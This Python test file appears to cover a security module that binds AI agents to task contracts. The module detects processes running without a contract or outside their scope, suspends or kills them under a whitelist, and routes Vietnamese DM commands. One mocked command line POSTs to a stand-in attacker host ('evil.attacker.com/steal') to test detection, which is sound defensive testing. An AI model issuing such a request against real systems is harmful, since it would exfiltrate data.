"""SEC-S1: TaskContractStore + SecurityWatcher + SecurityEventStore + actions + DM routing.

Mock 100% (không đụng tiến trình thật, không network thật); mọi file ghi dưới
tmp_path. Hành vi thật trên tiến trình thật thuộc live smoke (báo cáo riêng).
"""
from __future__ import annotations

import sys
from pathlib import Path

import pytest

WORKSPACE = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(WORKSPACE / "src"))
sys.path.insert(0, str(WORKSPACE))  # để import tools.*

from quan_ai_brain.security.task_contracts import (  # noqa: E402
    TaskContractStore,
    parse_dm_contract,
)
from quan_ai_brain.security.watcher import SecurityWatcher  # noqa: E402


# ---------------------------------------------------------------------------
# (a) Hợp đồng nhiệm vụ
# ---------------------------------------------------------------------------
class TestTaskContracts:
    def test_create_and_get_roundtrip(self, tmp_path: Path) -> None:
        store = TaskContractStore(tmp_path / "sec.db")
        c = store.create_contract(
            "codex-agent", "dọn file rác Downloads",
            allowed_paths=[r"E:\Downloads"], allowed_domains=["api.example.com"],
            duration_minutes=30, auto_contain=True,
        )
        assert c.subject == "codex-agent"
        assert c.status == "ACTIVE"
        assert c.auto_contain is True
        got = store.get_contract(c.contract_id)
        assert got is not None
        assert got.goal == "dọn file rác Downloads"
        assert got.allowed_paths == [r"E:\Downloads"]

    def test_create_requires_subject_and_goal(self, tmp_path: Path) -> None:
        store = TaskContractStore(tmp_path / "sec.db")
        with pytest.raises(ValueError):
            store.create_contract("", "mục tiêu")
        with pytest.raises(ValueError):
            store.create_contract("agent", "  ")

    def test_expiry_semantics(self, tmp_path: Path) -> None:
        store = TaskContractStore(tmp_path / "sec.db")
        short = store.create_contract("short-agent", "việc ngắn", duration_minutes=1)
        long = store.create_contract("long-agent", "việc dài")
        assert short.is_expired() is False          # vừa tạo, còn hạn
        assert short.expires_at != ""
        assert long.expires_at == ""                 # không hạn → không bao giờ hết hạn
        # ép quá hạn: sửa expires_at về quá khứ
        short.expires_at = "2000-01-01T00:00:00+00:00"
        assert short.is_expired() is True
        short.expires_at = "hạn sai định dạng"
        assert short.is_expired() is True            # fail-closed

    def test_lazy_expire_on_read(self, tmp_path: Path) -> None:
        store = TaskContractStore(tmp_path / "sec.db")
        c = store.create_contract("lazy", "việc", duration_minutes=1)
        with __import__("sqlite3").connect(str(tmp_path / "sec.db")) as conn:
            conn.execute("UPDATE task_contracts SET expires_at = ? WHERE contract_id = ?",
                         ("2000-01-01T00:00:00+00:00", c.contract_id))
        contracts = store.list_contracts()
        assert all(x.status == "EXPIRED" for x in contracts if x.contract_id == c.contract_id)
        assert store.active_contracts() == []

    def test_match_process(self, tmp_path: Path) -> None:
        store = TaskContractStore(tmp_path / "sec.db")
        c = store.create_contract("codex", "làm việc")
        # match_process trả object TẢI LẠI từ DB → so contract_id, không so identity
        assert store.match_process("python codex.exe --task x").contract_id == c.contract_id
        assert store.match_process("CODEX.EXE").contract_id == c.contract_id
        assert store.match_process("chrome.exe") is None
        assert store.match_process("") is None

    def test_status_transitions(self, tmp_path: Path) -> None:
        store = TaskContractStore(tmp_path / "sec.db")
        c = store.create_contract("agent", "việc")
        assert store.set_status(c.contract_id, "SUSPENDED") is True
        assert store.get_contract(c.contract_id).status == "SUSPENDED"
        assert store.match_process("agent.exe") is None    # suspend → không còn ACTIVE
        with pytest.raises(ValueError):
            store.set_status(c.contract_id, "TRẠNG THÁI LẠ")

    def test_subject_family_keywords(self, tmp_path: Path) -> None:
        store = TaskContractStore(tmp_path / "sec.db")
        store.create_contract("Alpha", "a")
        store.create_contract("alpha", "b")                # trùng (lower) → 1 keyword
        store.create_contract("beta", "c")
        store.set_status(store.list_contracts()[-1].contract_id, "REVOKED")
        assert store.subject_family_keywords() == ["alpha", "beta"]


# ---------------------------------------------------------------------------
# Parse lệnh DM tạo hợp đồng
# ---------------------------------------------------------------------------
class TestParseDmContract:
    def test_full_command(self) -> None:
        spec = parse_dm_contract(
            "giao nhiệm vụ cho codex: dọn file rác | phạm vi: E:\\Downloads, E:\\tmp | "
            "miền: api.example.com | hạn: 30 phút | tự giữ"
        )
        assert spec["subject"] == "codex"
        assert spec["goal"] == "dọn file rác"
        assert spec["allowed_paths"] == [r"E:\Downloads", r"E:\tmp"]
        assert spec["allowed_domains"] == ["api.example.com"]
        assert spec["duration_minutes"] == 30
        assert spec["auto_contain"] is True

    def test_hours_and_no_auto(self) -> None:
        spec = parse_dm_contract("giao nhiệm vụ cho bot AI: quét log | hạn: 2 giờ")
        assert spec["duration_minutes"] == 120
        assert spec["auto_contain"] is False
        assert spec["allowed_paths"] == []

    def test_missing_parts_fail_honest(self) -> None:
        with pytest.raises(ValueError):
            parse_dm_contract("giao nhiệm vụ cho  ")                 # thiếu hết
        with pytest.raises(ValueError):
            parse_dm_contract("giao nhiệm vụ cho bot:")              # thiếu goal
        with pytest.raises(ValueError):
            parse_dm_contract("mở chrome")                            # không phải lệnh hợp đồng


# ---------------------------------------------------------------------------
# Bằng chứng an ninh (append-only)
# ---------------------------------------------------------------------------
class TestSecurityEventStore:
    def test_record_recent_mark(self, tmp_path: Path) -> None:
        from quan_ai_brain.security.watcher import SecurityEventStore

        store = SecurityEventStore(tmp_path / "events.db")
        i1 = store.record("UNREGISTERED", 111, "evil.exe", "evil.exe --x", evidence={"k": 1})
        i2 = store.record("OVER_CONTRACT", 222, "bot.exe", "bot.exe", contract_id="sec_x")
        assert i1 != i2
        rows = store.recent(limit=10)
        assert len(rows) == 2
        assert rows[0]["violation"] == "OVER_CONTRACT"        # DESC
        assert store.recent(unhandled_only=True)
        assert store.mark_handled(i1, "owner_kill") is True
        pending = store.recent(unhandled_only=True)
        assert [r["id"] for r in pending] == [i2]
        assert store.mark_handled_by_pid(222, "auto_suspend") == 1
        assert store.recent(unhandled_only=True) == []


# ---------------------------------------------------------------------------
# (b) Vệ sĩ — detect (mock subprocess qua monkeypatch method)
# ---------------------------------------------------------------------------
@pytest.fixture()
def watcher(tmp_path: Path):
    from quan_ai_brain.security.watcher import SecurityEventStore, SecurityWatcher

    contracts = TaskContractStore(tmp_path / "c.db")
    events = SecurityEventStore(tmp_path / "e.db")
    return SecurityWatcher(contracts, events), contracts, events


class TestWatcherDetect:
    def test_no_contracts_no_scan(self, watcher) -> None:
        w, contracts, _ = watcher
        assert w.detect_violations() == []                    # chưa đăng ký gì

    def test_unregistered_family_process(self, watcher, monkeypatch) -> None:
        w, contracts, events = watcher
        c = contracts.create_contract("fakeagent", "việc giả lập")
        contracts.set_status(c.contract_id, "REVOKED")        # hết thẩm quyền
        monkeypatch.setattr(SecurityWatcher, "list_processes",
                            staticmethod(lambda: [{"name": "fakeagent.exe", "pid": 777, "mem_kb": 10}]))
        monkeypatch.setattr(SecurityWatcher, "get_cmdline",
                            staticmethod(lambda pid: "fakeagent.exe --run"))
        viols = w.detect_violations(deep=True)
        assert [v["violation"] for v in viols] == ["UNREGISTERED"]
        assert viols[0]["pid"] == 777
        assert len(events.recent(unhandled_only=True)) == 1

    def test_active_contract_no_violation(self, watcher, monkeypatch) -> None:
        w, contracts, events = watcher
        contracts.create_contract("goodagent", "việc hợp lệ",
                                  allowed_paths=[r"E:\work"], allowed_domains=["api.ok.com"])
        monkeypatch.setattr(SecurityWatcher, "list_processes",
                            staticmethod(lambda: [{"name": "goodagent.exe", "pid": 55, "mem_kb": 10}]))
        monkeypatch.setattr(SecurityWatcher, "get_cmdline",
                            staticmethod(lambda pid: r"python goodagent.exe --dir E:\work https://api.ok.com/v1"))
        assert w.detect_violations(deep=True) == []
        assert events.recent() == []

    def test_out_of_scope_path(self, watcher, monkeypatch) -> None:
        w, contracts, events = watcher
        contracts.create_contract("pagent", "việc", allowed_paths=[r"E:\allowed"])
        monkeypatch.setattr(SecurityWatcher, "list_processes",
                            staticmethod(lambda: [{"name": "pagent.exe", "pid": 66, "mem_kb": 10}]))
        monkeypatch.setattr(SecurityWatcher, "get_cmdline",
                            staticmethod(lambda pid: r"python pagent.exe C:\Windows\secret.py"))
        viols = w.detect_violations(deep=True)
        assert [v["violation"] for v in viols] == ["OUT_OF_SCOPE_PATH"]
        assert viols[0]["evidence"]["out_of_scope_path"].endswith("secret.py")

    def test_out_of_scope_domain(self, watcher, monkeypatch) -> None:
        w, contracts, events = watcher
        contracts.create_contract("dagent", "việc", allowed_domains=["api.ok.com"])
        monkeypatch.setattr(SecurityWatcher, "list_processes",
                            staticmethod(lambda: [{"name": "dagent.exe", "pid": 77, "mem_kb": 10}]))
        monkeypatch.setattr(SecurityWatcher, "get_cmdline",
                            staticmethod(lambda pid: "dagent.exe POST https://evil.attacker.com/steal"))
        viols = w.detect_violations(deep=True)
        assert [v["violation"] for v in viols] == ["OUT_OF_SCOPE_DOMAIN"]
        assert "evil.attacker.com" in viols[0]["evidence"]["out_of_scope_domains"]

    def test_tasklist_csv_parsing(self, monkeypatch) -> None:
        from quan_ai_brain.security.watcher import SecurityWatcher

        fake_csv = '"chrome.exe","1234","Console","1","123,456 K"\r\n"notepad.exe","99","Console","1","5,000 K"\r\n'
        class FakeProc:
            def __init__(self, *a, **k):
                pass
            def run(self, *a, **k):
                return type("R", (), {"stdout": fake_csv, "returncode": 0})()
        import quan_ai_brain.security.watcher as wmod
        monkeypatch.setattr(wmod.subprocess, "run", FakeProc().run)
        procs = SecurityWatcher.list_processes()
        assert procs[0] == {"name": "chrome.exe", "pid": 1234, "mem_kb": 123456}
        assert procs[1]["pid"] == 99


# ---------------------------------------------------------------------------
# (c) Hành động — whitelist cứng (fail-closed)
# ---------------------------------------------------------------------------
class TestActionsWhitelist:
    def test_protected_system_process(self, monkeypatch) -> None:
        from quan_ai_brain.security import actions

        monkeypatch.setattr(actions, "get_process_info",
                            lambda pid: {"pid": pid, "name": "svchost.exe", "cmdline": "svchost"})
        r = actions.suspend_process(4242)
        assert r["success"] is False
        assert "TỪ CHỐI" in r["reason"]

    def test_protected_tony_component(self, monkeypatch) -> None:
        from quan_ai_brain.security import actions

        monkeypatch.setattr(actions, "get_process_info",
                            lambda pid: {"pid": pid, "name": "pythonw.exe",
                                         "cmdline": r'"E:\BRAIN\.venv\Scripts\pythonw.exe" tools\watchdog.py'})
        r = actions.kill_process(4242)
        assert r["success"] is False
        assert "watchdog.py" in r["reason"] or "TONY" in r["reason"]

    def test_missing_pid(self, monkeypatch) -> None:
        from quan_ai_brain.security import actions

        monkeypatch.setattr(actions, "get_process_info", lambda pid: None)
        for fn in (actions.suspend_process, actions.resume_process, actions.kill_process):
            r = fn(999999)
            assert r["success"] is False
            assert "không tồn tại" in r["reason"]


# ---------------------------------------------------------------------------
# (d) Lệnh DM
# ---------------------------------------------------------------------------
class TestSecurityDmRouting:
    def test_route_security_status(self, tmp_path, monkeypatch) -> None:
        import tools.netchat_security_center as sec

        monkeypatch.setattr(sec, "WORKSPACE", tmp_path)
        intent, reply = sec.route_security_command("an ninh")
        assert intent == "an_ninh"
        assert "AN NINH" in reply
        # không khớp lệnh khác
        assert sec.route_security_command("mở chrome") is None
        assert sec.route_security_command("trạng thái") is None

    def test_route_hold_release_kill(self, tmp_path, monkeypatch) -> None:
        import tools.netchat_security_center as sec

        monkeypatch.setattr(sec, "WORKSPACE", tmp_path)
        monkeypatch.setattr(sec, "_do_action", lambda action, pid: f"MOCK:{action}:{pid}")
        assert sec.route_security_command("giữ 1234") == ("sec_hold", "MOCK:suspend:1234")
        assert sec.route_security_command("giu pid 1234") == ("sec_hold", "MOCK:suspend:1234")
        assert sec.route_security_command("thả 1234") == ("sec_release", "MOCK:resume:1234")
        assert sec.route_security_command("hạ 1234") == ("sec_kill", "MOCK:kill:1234")
        assert sec.route_security_command("hạ gục 1234") == ("sec_kill", "MOCK:kill:1234")

    def test_route_create_contract(self, tmp_path, monkeypatch) -> None:
        import tools.netchat_security_center as sec

        monkeypatch.setattr(sec, "WORKSPACE", tmp_path)
        intent, reply = sec.route_security_command(
            "giao nhiệm vụ cho codex-test: dọn rác | phạm vi: E:\\tmp | hạn: 10 phút | tự giữ")
        assert intent == "sec_contract"
        assert "hợp đồng" in reply and "codex-test" in reply
        # hợp đồng thật sự lưu
        store = TaskContractStore(tmp_path / "data" / "security_contracts.db")
        assert len(store.active_contracts()) == 1

    def test_dm_command_through_router(self, tmp_path, monkeypatch) -> None:
        """route_message tổng nhận đúng lệnh an ninh (wire thật)."""
        from tools.netchat_command_center import route_message

        monkeypatch.setattr("tools.netchat_security_center.WORKSPACE", tmp_path)
        monkeypatch.setattr("tools.netchat_security_center._dm_send", lambda text: None)
        intent, reply = route_message("an ninh")
        assert intent == "an_ninh"
        assert "AN NINH" in reply


class TestWatchdogCycle:
    def test_no_contracts_zero_cost(self, tmp_path, monkeypatch) -> None:
        import tools.netchat_security_center as sec

        monkeypatch.setattr(sec, "WORKSPACE", tmp_path)
        assert sec.security_watchdog_cycle() == 0

    def test_violation_flow_with_auto_contain(self, tmp_path, monkeypatch) -> None:
        import tools.netchat_security_center as sec
        from quan_ai_brain.security.watcher import SecurityEventStore, SecurityWatcher

        monkeypatch.setattr(sec, "WORKSPACE", tmp_path)
        contracts = TaskContractStore(tmp_path / "data" / "security_contracts.db")
        c = contracts.create_contract("rogue", "việc", auto_contain=True)

        events = SecurityEventStore(tmp_path / "data" / "security_events.db")
        fake_viols = [{"violation": "UNREGISTERED", "pid": 31337,
                       "process_name": "rogue.exe",
                       "evidence": {"cmdline": "rogue.exe --x"}}]

        class FakeWatcher:
            def __init__(self, contracts_arg, events_arg):
                assert isinstance(contracts_arg, TaskContractStore)
                self.events = events_arg
            def detect_violations(self, deep: bool = True):
                return list(fake_viols)

        monkeypatch.setattr("quan_ai_brain.security.watcher.SecurityWatcher", FakeWatcher)
        monkeypatch.setattr("quan_ai_brain.security.watcher.SecurityEventStore",
                            lambda path: events)
        suspended: list[int] = []
        monkeypatch.setattr("quan_ai_brain.security.actions.suspend_process",
                            lambda pid: (suspended.append(pid), {"success": True})[1])
        sent: list[str] = []
        monkeypatch.setattr(sec, "_dm_send", lambda text: sent.append(text))

        n = sec.security_watchdog_cycle()
        assert n == 1
        assert suspended == [31337]                             # auto-contain ĐÃ GIỮ
        assert events.recent(unhandled_only=True) == []         # đã mark handled
        assert "rogue.exe" in sent[0] and "TẠM GIỮ" in sent[0]  # DM đã báo
